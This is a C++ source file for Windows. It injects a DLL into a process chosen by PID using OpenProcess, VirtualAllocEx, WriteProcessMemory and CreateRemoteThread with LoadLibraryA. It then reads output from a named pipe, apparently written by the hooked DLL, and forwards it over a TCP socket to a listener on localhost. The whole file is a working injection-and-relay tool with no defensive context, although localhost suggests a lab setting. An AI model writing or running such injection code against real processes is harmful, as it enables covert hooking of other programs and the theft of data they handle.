#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <cstdio>
#include "stdio.h"

#pragma warning(disable: 4996)

bool injection();

void log_handler(SOCKET);

int main() {
    //** Network settings**//
    WSAData wsaData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if (WSAStartup(DLLVersion, &wsaData) != 0) {
        std::cout << "Error" << std::endl;
        exit(1);
    }

    SOCKADDR_IN addr;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(708);
    addr.sin_family = AF_INET;

    SOCKET Connection;
    Connection = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("Error: failed connect to server. WSA last error: : %d\n", WSAGetLastError());
    }
    printf("Connected.\n");

    injection();
    Sleep(200);
    log_handler(Connection);

    closesocket(Connection);
    return 0;
}

void log_handler(SOCKET connection) {
    HANDLE hPipe;
    char buffer[254];
    DWORD dwRead;


    hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\Pipe"),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,  
        1,
        1024 * 16,
        1024 * 16,
        NMPWAIT_USE_DEFAULT_WAIT,
        NULL);
    while (hPipe != INVALID_HANDLE_VALUE)
    {
        if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
        {
            while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
            {       
                /* add terminating zero */
                buffer[dwRead] = '\0';

                /* do something with data in buffer */
                printf("%s", buffer);
                send(connection, buffer, sizeof(buffer), NULL);
            }
        }

        DisconnectNamedPipe(hPipe);
    }
}

bool injection() {
    DWORD injection_pid = 0;
    const char* dll_name = "c:\\1\\dll_hook_ test.dll";

    printf("Enter PID to inject: ");
    std::cin >> injection_pid;

    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, injection_pid);
    if (process == NULL) {
        printf("OpenProcess error: %d\n", GetLastError());
        return 0;
    }

    HMODULE kernel_md = GetModuleHandleW(L"kernel32.dll");
    if (kernel_md == NULL) {
        printf("GetModuleHandleW error: %d\n", GetLastError());
        return 0;
    }

    LPVOID library_addr = GetProcAddress(kernel_md, "LoadLibraryA"); // A for ANSI
    if (library_addr == NULL) {
        printf("GetProcAddress error: %d\n", GetLastError());
        return 0;
    }

    LPVOID arg_library_addr = (LPVOID)VirtualAllocEx(process, NULL, strlen(dll_name), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (arg_library_addr == NULL) {
        printf("VirtualAllocEx error: %d\n", GetLastError());
        return 0;
    }

    int written_bytes = WriteProcessMemory(process, arg_library_addr, dll_name, strlen(dll_name), NULL);
    if (written_bytes == NULL) {
        printf("WriteProcessMemory error: %d\n", GetLastError());
        return 0;
    }

    HANDLE thread_id = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)library_addr, arg_library_addr, NULL, NULL);

    if (thread_id == NULL) {
        printf("CreateRemoteThread error: %d\n", GetLastError());
        return 0;
    }
    else printf("Dll injected.");

    CloseHandle(process);

    return 1;
}